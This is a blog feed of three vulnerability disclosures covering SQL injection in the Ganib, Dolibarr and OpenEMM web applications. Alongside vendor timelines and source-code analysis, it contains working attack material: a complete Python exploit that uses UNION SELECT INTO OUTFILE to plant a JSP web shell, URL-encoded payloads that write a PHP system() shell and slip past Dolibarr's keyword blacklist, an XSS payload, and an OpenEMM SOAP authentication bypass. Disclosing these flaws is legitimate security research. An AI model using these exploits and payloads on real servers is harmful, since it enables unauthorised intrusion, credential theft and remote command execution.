<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: sqli | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/sqli/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2020-08-10T13:11:36-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
    <updated>2014-02-24T21:03:07-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>

<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>

<p>```
String theme = request.getParameter(&ldquo;theme&rdquo;);
User user = (User) pageContext.getAttribute(&ldquo;user&rdquo;, PageContext.SESSION_SCOPE);
if( user != null &amp;&amp; user.getID() != null ) {</p>

<pre><code>DBBean db = new DBBean();

try {
    String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
    db.prepareStatement(query);
    db.executePrepared();
} finally {
    db.release();
}
</code></pre>

<p>```</p>

<p>It&rsquo;s obvious where the flaw is.</p>

<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>

<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>

<p>```
// Grab parameters from Login form
String secure = request.getParameter (&ldquo;secure&rdquo;);
String username = request.getParameter (&ldquo;J_USERNAME&rdquo;);
username = username == null ? u_name : username;
String password = request.getParameter (&ldquo;J_PASSWORD&rdquo;);
password = password == null ? pwd : password;
String userDomain = request.getParameter(&ldquo;userDomain&rdquo;);</p>

<p>[&hellip;]</p>

<p>else</p>

<pre><code>loginManager.createLoginContext(username, password, userDomain);
</code></pre>

<p>```</p>

<p>And the request, for reference:</p>

<p>```
POST /LoginProcessing.jsp HTTP/1.1
Host: 192.168.1.219:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: <a href="http://192.168.1.219:8080/">http://192.168.1.219:8080/</a>
Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; <em>sid=; </em>styp=; JSPRootURL=; cookies=true
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 109</p>

<p>theAction=submit&amp;J_USERNAME=bob%40bob.com&amp;J_PASSWORD=password&amp;language=en&amp;remember_checkbox=on&amp;userDomain=1000
```</p>

<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>

<p>```
try
{</p>

<pre><code>domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
statusCode = LoginStatusCode.SUCCESS;
</code></pre>

<p>}
```</p>

<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg">http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg</a>"></p>

<p>Note that, so far, none of the provided input has yet to be sanitized.</p>

<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>

<p>```
private DomainAuthenticator(String domainID, String username, String clearTextPassword)
  throws DomainException
{
  try
  {</p>

<pre><code>UserDomain domain = new UserDomain();
domain.setID(domainID);
domain.load();
setDomain(domain);

setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
</code></pre>

<p>  }
```</p>

<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>

<p>```
 public void load()</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>DBBean db = new DBBean();
try
{
  load(db);
} finally {
  db.release();
}
</code></pre>

<p>  }</p>

<p>  public void load(DBBean db)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>loadProperties(db);

loadUsers(db);

loadSupportedConfigurations(db);
</code></pre>

<p>  }
```</p>

<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>

<p>```
 public void loadUsers(DBBean db)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>if (this.domainID == null) {
  throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
}

if (this.userCollection == null) {
  this.userCollection = new DomainUserCollection();
}

this.userCollection.setDomainID(getID());
this.userCollection.load(db);
</code></pre>

<p>  }
```</p>

<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>

<p>```
 protected void load(DBBean dbean)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();

if (this.domainID == null) {
  throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
}
</code></pre>

<p>  [&hellip;]</p>

<p>  dbean.executeQuery(qstrLoadUsersForDomain);
```</p>

<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>

<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>

<p>```
root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
[!] Dropping ./cmd.jsp on 192.168.1.64&hellip;
[!] Dropped at /wjdll.jsp
root@jali:~/exploits# python -c &lsquo;import requests; print requests.get(&ldquo;<a href="http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd">http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd</a>&rdquo;).content&rsquo;</p>

<p>/var/www/ganib/tomcat/bin</p>

<pre><code>1    2    3
</code></pre>

<p>root@jali:~/exploits#
```</p>

<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>

<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>

<p>```</p>

<h1>Exploit title: Ganib 2.0 SQLi</h1>

<h1>Date: 02/02/2014</h1>

<h1>Exploit author: drone (@dronesec)</h1>

<h1>More information:</h1>

<h1>Vendor homepage: <a href="http://www.ganib.com/">http://www.ganib.com/</a></h1>

<h1>Software link: <a href="http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip">http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip</a></h1>

<h1>Version: &lt;= 2.3</h1>

<h1>Fixed in: 2.4</h1>

<h1>Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3</h1>

<p>from argparse import ArgumentParser
import sys
import string
import random
import requests</p>

<p>&ldquo;&rdquo;&ldquo; Ganib 2.0 preauth SQLi PoC</p>

<pre><code>@dronesec
</code></pre>

<p>&ldquo;&rdquo;"</p>

<p>def loadJSP(options):</p>

<pre><code>data = ''

try:
    with open(options.jsp) as f:
        for line in f.readlines():
            data += line.replace("\"", "\\\"").replace('\n', '')
except Exception, e:
    print e
    sys.exit(1)

return data
</code></pre>

<p>def run(options):</p>

<pre><code>print '[!] Dropping %s on %s...' % (options.jsp, options.ip)

url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)

data = { "theAction" : "submit",
         "J_USERNAME" : "test",
         "J_PASSWORD" : "test",
         "language" : "en",
         "remember_checkbox" : "on",
         "userDomain" : exploit
       }

res = requests.post(url, data=data)
if res.status_code is 200:
    print '[!] Dropped at /{0}.jsp'.format(shell)
else:
    print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
</code></pre>

<p>def parse():</p>

<pre><code>parser = ArgumentParser()
parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
                    required=True)
parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
                    action='store', default='/var/www/ganib')
parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')

options = parser.parse_args()
options.path = options.path if options.path[-1] != '/' else options.path[:-1]
return options
</code></pre>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>run(parse())
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dolibarr 3.4.0 - Multiple Vulnerabilities]]></title>
    <link href="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/"/>
    <updated>2013-10-14T22:13:15-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities</id>
    <content type="html"><![CDATA[<p><a href="http://www.dolibarr.org/">Dolibarr</a> is an open source, enterprise-grade ERP/CRM application developed in PHP.  The latest stable release, 3.4.0, is vulnerable to a host of remotely exploitable post and pre auth vulnerabilities, along with several seriously mind-bending security/architecture choices.  These vulnerabilities and issues were privately disclosed to the vendor, and the SQLi was patched in version 3.4.1.  However, their sanitization methods were not fixed, and no mention was made on a future patch.  Other SQLi vectors are likely.</p>

<p>There are multiple SQL injections that lead to a compromise of the availability/integrity of the database or web server.  The scenario and context of the vulnerabilities are rather interesting, as multiple blacklisting techniques are used by Dolibarr in an attempt to mitigate malicious queries slipping through; nevertheless, as we know, blacklisting never works.  No parameterized queries are to be found in source.</p>

<p>The following is included in each page and used for &ldquo;sanitization&rdquo; <code>main.inc.php</code>:</p>

<p>```
function analyse_sql_and_script(&amp;$var, $type)
{</p>

<pre><code>if (is_array($var))
{
    foreach ($var as $key =&gt; $value)
    {
        if (analyse_sql_and_script($value,$type))
        {
            $var[$key] = $value;
        }
        else
        {
            print 'Access refused by SQL/Script injection protection in main.inc.php';
            exit;
        }
    }
    return true;
}
else
{
    return (test_sql_and_script_inject($var,$type) &lt;= 0);
}
</code></pre>

<p>}
```</p>

<p>Pretty typical recursive function for sanitizing input.  The following performs the actual sanity checking:</p>

<p>```
function test_sql_and_script_inject($val, $type)
{</p>

<pre><code>$sql_inj = 0;
// For SQL Injection (only GET and POST are used to be included into bad escaped SQL requests)
if ($type != 2)
{
    $sql_inj += preg_match('/delete[\s]+from/i', $val);
    $sql_inj += preg_match('/create[\s]+table/i', $val);
    $sql_inj += preg_match('/update.+set.+=/i', $val);
    $sql_inj += preg_match('/insert[\s]+into/i', $val);
    $sql_inj += preg_match('/select.+from/i', $val);
    $sql_inj += preg_match('/union.+select/i', $val);
    $sql_inj += preg_match('/(\.\.%2f)+/i', $val);
}
// For XSS Injection done by adding javascript with script
// This is all cases a browser consider text is javascript:
// When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&amp;' on a tag size with old browsers
// All examples on page: http://ha.ckers.org/xss.html#XSScalc
$sql_inj += preg_match('/&lt;script/i', $val);
if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
$sql_inj += preg_match('/base[\s]+href/i', $val);
if ($type == 1)
{
    $sql_inj += preg_match('/javascript:/i', $val);
    $sql_inj += preg_match('/vbscript:/i', $val);
}
// For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
return $sql_inj;
</code></pre>

<p>}
```</p>

<p>It&rsquo;s quite clear that the blacklisting approach is inefficient; particularly the cross-site scripting protection.  The SQLi blacklisting doesn&rsquo;t restrict INTO OUTFILE/DUMPFILE, meaning with a well-tuned SQL injection we can throw a web shell onto the box.</p>

<p>Let&rsquo;s take a look at one such vulnerable query <code>contact/fiche.php</code>:</p>

<p>```
if ($action == &lsquo;confirm_delete&rsquo; &amp;&amp; $confirm == &lsquo;yes&rsquo; &amp;&amp; $user->rights->societe->contact->supprimer)</p>

<pre><code>{
    $result=$object-&gt;fetch($_GET["id"]);
</code></pre>

<p>```</p>

<p><code>contact/class/contact.class.php</code>
```
function fetch($id, $user=0)</p>

<pre><code>{
    global $langs;

    $langs-&gt;load("companies");

    $sql = "SELECT c.rowid, c.fk_soc, c.civilite as civilite_id, c.lastname, c.firstname,";
    $sql.= " c.address, c.zip, c.town,";
    $sql.= " c.fk_pays as country_id,";
    $sql.= " c.fk_departement,";
    $sql.= " c.birthday,";
    $sql.= " c.poste, c.phone, c.phone_perso, c.phone_mobile, c.fax, c.email, c.jabberid,";
    $sql.= " c.priv, c.note_private, c.note_public, c.default_lang, c.no_email, c.canvas,";
    $sql.= " c.import_key,";
    $sql.= " p.libelle as country, p.code as country_code,";
    $sql.= " d.nom as state, d.code_departement as state_code,";
    $sql.= " u.rowid as user_id, u.login as user_login,";
    $sql.= " s.nom as socname, s.address as socaddress, s.zip as soccp, s.town as soccity, s.default_lang as socdefault_lang";
    $sql.= " FROM ".MAIN_DB_PREFIX."socpeople as c";
    $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_pays as p ON c.fk_pays = p.rowid";
    $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_departements as d ON c.fk_departement = d.rowid";
    $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."user as u ON c.rowid = u.fk_socpeople";
    $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."societe as s ON c.fk_soc = s.rowid";
    $sql.= " WHERE c.rowid = ". $id;

    dol_syslog(get_class($this)."::fetch sql=".$sql);
    $resql=$this-&gt;db-&gt;query($sql);
</code></pre>

<p>```</p>

<p>Our vulnerable parameter <code>id</code> is sanitized only by the previously described functions.  There are now two main options; dump information from the database, or drop a web shell onto the host.  The latter is the best case and the former is, usually, a good consolatory prize.  However, in this case, the database is ripe with information, specifically:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG">http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG</a>"></p>

<p>Yeah, that&rsquo;s your plaintext password stored right next to the hashed version.  Dumping the database just got a whole lot more interesting.</p>

<p>Our attention now turns to evading the filters listed above.  For obtaining a shell, the only evasion we need to consider is UNION SELECT, as INTO OUTFILE/DUMPFILE is not filtered.  After a bit of deliberation and source code analysis, it was determined that the filters were trivially bypassed by URL encoding SQL keywords.  The following query will drop a web shell at the given location:</p>

<p><code>
http://localhost/dolibarr-3.4.0/htdocs/contact/fiche.php?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php'&amp;action=confirm_delete&amp;confirm=yes HTTP/1.1
</code></p>

<p>Which results in:</p>

<p><img class="center <a" src="href="http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG">http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG</a>" title="" ></p>

<p>The documents folder is a perfect candidate for our web shell as, during installation of the CMS, this folder must be user-created and writable by the install, giving us a guaranteed and predictable location for the web shell.</p>

<p>This vulnerability has been detected in <code>contact.class.php</code> in four different functions: fetch, update, delete, and create.</p>

<p>We now take another look at the XSS filtering function:</p>

<p>```
  // For XSS Injection done by adding javascript with script</p>

<pre><code>// This is all cases a browser consider text is javascript:
// When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&amp;' on a tag size with old browsers
// All examples on page: http://ha.ckers.org/xss.html#XSScalc
$sql_inj += preg_match('/&lt;script/i', $val);
if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
$sql_inj += preg_match('/base[\s]+href/i', $val);
if ($type == 1)
{
    $sql_inj += preg_match('/javascript:/i', $val);
    $sql_inj += preg_match('/vbscript:/i', $val);
}
// For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
return $sql_inj;
</code></pre>

<p>```</p>

<p>As we can see, this is quite weak, and we can get by with a very simple injection, <code>&lt;body onload=alert(1)&gt;</code>.  Injecting this into the last name of a contact results in success:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG">http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG</a>"></p>

<p>With this we can syphon off session IDs and completely hijack sessions.  Any field that&rsquo;s reflected back to the user is vulnerable, and considering this is a CMS, that&rsquo;s a lot.</p>

<p>All of the discussed vulnerabilities have, thus far, been post-auth.  One remotely exploitable pre-auth vulnerability was discovered in <code>public/members/public_list.php</code> (configured with <code>define("NOLOGIN",1)</code>), meaning it does not require auth):</p>

<p>```
$sortfield = GETPOST(&ldquo;sortfield&rdquo;,&lsquo;alpha&rsquo;);
$sortorder = GETPOST(&ldquo;sortorder&rdquo;,&lsquo;alpha&rsquo;);
$page = GETPOST(&ldquo;page&rdquo;,&lsquo;int&rsquo;);
if ($page == -1) { $page = 0; }
$offset = $conf->liste_limit * $page;
$pageprev = $page &ndash; 1;
$pagenext = $page + 1;</p>

<p>$filter=GETPOST(&lsquo;filter&rsquo;);
$statut=GETPOST(&lsquo;statut&rsquo;);</p>

<p>if (! $sortorder) {  $sortorder=&ldquo;ASC&rdquo;; }
if (! $sortfield) {  $sortfield=&ldquo;nom&rdquo;; }</p>

<p>/<em>
 * View
 </em>/</p>

<p>llxHeaderVierge($langs->trans(&ldquo;ListOfValidatedPublicMembers&rdquo;));</p>

<p>$sql = &ldquo;SELECT rowid, firstname, lastname, societe, zip, town, email, birth, photo&rdquo;;
$sql.= &ldquo; FROM &rdquo;.MAIN_DB_PREFIX.&ldquo;adherent&rdquo;;
$sql.= &ldquo; WHERE entity = &rdquo;.$entity;
$sql.= &ldquo; AND statut = 1&rdquo;;
$sql.= &ldquo; AND public = 1&rdquo;;
$sql.= $db->order($sortfield,$sortorder);
$sql.= $db->plimit($conf->liste_limit+1, $offset);
```</p>

<p>And <code>core/db/msqli.class.php</code></p>

<p>```
 function order($sortfield=0,$sortorder=0)</p>

<pre><code>{
    if ($sortfield)
    {
        $return='';
        $fields=explode(',',$sortfield);
        foreach($fields as $val)
        {
            if (! $return) $return.=' ORDER BY ';
            else $return.=',';

            $return.=preg_replace('/[^0-9a-z_\.]/i','',$val);
            if ($sortorder) $return.=' '.preg_replace('/[^0-9a-z]/i','',$sortorder);
        }
        return $return;
    }
    else
    {
        return '';
    }
}
</code></pre>

<p>```</p>

<p>And navigation to the page results in:</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG">http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG</a>"></p>

<p>As shown, the <code>sortfield</code> and <code>sortorder</code> parameters are inadequately sanitized, but exploitation may be a bit tricky.  The order function strips everything that isn&rsquo;t a number, lowercase alphanumeric letter, or one of three symbols.  Instead, why don&rsquo;t we exploit yet <em>another</em> preauth vulnerability in <code>opensurvey/public/exportcsv.php</code></p>

<p>`&ldquo;
$action=GETPOST(&lsquo;action&rsquo;);
$numsondage = $numsondageadmin = &rdquo;;</p>

<p>if (GETPOST(&lsquo;sondage&rsquo;))
{</p>

<pre><code>if (strlen(GETPOST('sondage')) == 24)    // recuperation du numero de sondage admin (24 car.) dans l'URL
{
    $numsondageadmin=GETPOST("sondage",'alpha');
    $numsondage=substr($numsondageadmin, 0, 16);
}
else
{
    $numsondageadmin='';
    $numsondage=GETPOST("sondage",'alpha');
}
</code></pre>

<p>}</p>

<p>$object=new Opensurveysondage($db);
$result=$object->fetch(0,$numsondage);
if ($result &lt;= 0) dol_print_error(&lsquo;&rsquo;,&lsquo;Failed to get survey id &rsquo;.$numsondage);
```</p>

<p>And <code>opensurvey/class/opensurveysondage.class.php</code></p>

<p>`&ldquo;
function fetch($id,$numsurvey=&rdquo;)
{
global $langs;</p>

<p>$sql = &ldquo;SELECT&rdquo;;
//$sql.= &ldquo; t.rowid,&rdquo;;
$sql.= &ldquo; t.id_sondage,&rdquo;;
$sql.= &ldquo; t.commentaires,&rdquo;;
$sql.= &ldquo; t.mail_admin,&rdquo;;
$sql.= &ldquo; t.nom_admin,&rdquo;;
$sql.= &ldquo; t.titre,&rdquo;;
$sql.= &ldquo; t.id_sondage_admin,&rdquo;;
$sql.= &ldquo; t.date_fin,&rdquo;;
$sql.= &ldquo; t.format,&rdquo;;
$sql.= &ldquo; t.mailsonde,&rdquo;;
$sql.= &ldquo; t.survey_link_visible,&rdquo;;
$sql.= &ldquo; t.canedit,&rdquo;;
$sql.= &ldquo; t.sujet,&rdquo;;
$sql.= &ldquo; t.tms&rdquo;;
$sql.= &ldquo; FROM &rdquo;.MAIN_DB_PREFIX.&ldquo;opensurvey_sondage as t&rdquo;;
if ($id > 0) $sql.= &ldquo; WHERE t.rowid = &rdquo;.$id;
else if (strlen($numsurvey) == 16) $sql.= &ldquo; WHERE t.id_sondage = &lsquo;&rdquo;.$numsurvey.&ldquo;&rsquo;&rdquo;;
else $sql.= &ldquo; WHERE t.id_sondage_admin = &lsquo;&rdquo;.$numsurvey.&ldquo;&rsquo;&rdquo;;</p>

<p>dol_syslog(get_class($this).&ldquo;::fetch sql=&rdquo;.$sql, LOG_DEBUG);
$resql=$this->db->query($sql);
```</p>

<p>As the bolded path shows, the query argument <code>numsurvey</code> is directly controllable by an unauthenticated user, leading to the same type of SQL vulnerability shown earlier.  This can be exploited with the following:</p>

<p><code>
GET /dolibarr/htdocs/opensurvey/public/exportcsv.php?sondage='%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php';%20--%20-%20 HTTP/1.1
</code></p>

<p>Using the same URL encoding trick from before, we can bypass the blacklisting and inject directly into the vulnerable query.  Exploit code for this is included at the bottom of the post:</p>

<p><code>
root@jali:~/exploits# python dolibarr_34_sploit.py -i 192.168.1.100 -p /dolibarr-3.4.0 -w /var/www/dolibarr-3.4.0/documents
[!] Dropping web shell on 192.168.1.100...
[!] Shell dropped.  http://192.168.1.100/documents/o4oct.php?cmd=ls
root@jali:~/exploits#
</code></p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG">http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG</a>"></p>

<p>Fortunately, for users running DoliWamp,  Dolibarr + WAMP package on Windows, the default user that the database runs with is not allowed to write files.  They are still vulnerable, however, to database corruption and traversal (i.e. drop table subqueries, etc.).</p>

<h3>Timeline</h3>


<ul>
<li>10/06/2013 &ndash; Vendor notified of remotely exploitable vulnerabilities</li>
<li>10/07/2013 &ndash; Vendor acknowledges vulnerability, no timeline provided</li>
<li>10/11/2013 &ndash; Vendor states fix will be in the 3.4.1 release within the month</li>
<li>10/14/2013 &ndash; 3.4.1 released with patch.  This advisory released</li>
</ul>


<p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
    <updated>2013-07-28T22:24:15-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>

<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>

<p>```
  /**</p>

<pre><code> * Gets the SQL string.
 */
public static String getSQLSafeString(String input) {
    if (input == null) {
        return " ";
    } else {
        return input.replace("'", "''");
    }
}
</code></pre>

<p>```</p>

<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>

<p><code>
\' AND UNION SELECT 1,2,3;--
</code></p>

<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>

<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>

<p>```
protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {</p>

<pre><code>    boolean result=false;
    Connection dbConn=this.getConnection(msct);
    Statement agnStatement=null;
    ResultSet rset=null;

    try {
        agnStatement=dbConn.createStatement();
        rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
        if(rset!=null &amp;&amp; rset.next()) {
            result=true;
        } else {
            result=false;
            HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
            log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
        }
</code></pre>

<p>```</p>

<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>

<p>The following code will bypass SOAP authentication and add a new mailing list:</p>

<p>```
from SOAPpy import WSDL</p>

<p>wsdl_file = &ldquo;./ws.wsdl&rdquo;
sploit = &ldquo;\&lsquo; OR 1=1;&mdash; &rdquo;</p>

<p><em>server = WSDL.Proxy(wsdl_file)
ret = </em>server.addMailinglist(&ldquo;wsadmin&rdquo;, sploit, &ldquo;w00t&rdquo;, &ldquo;w00t&rdquo;)
if ret > 0:</p>

<pre><code>print 'success (%d)'%ret
</code></pre>

<p>```</p>

<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>

<p>```
root@jali:~/exploits# python openemm_wsdl.py -h
usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [&mdash;dm] [&mdash;ds]</p>

<p>optional arguments:
  -h, &mdash;help  show this help message and exit
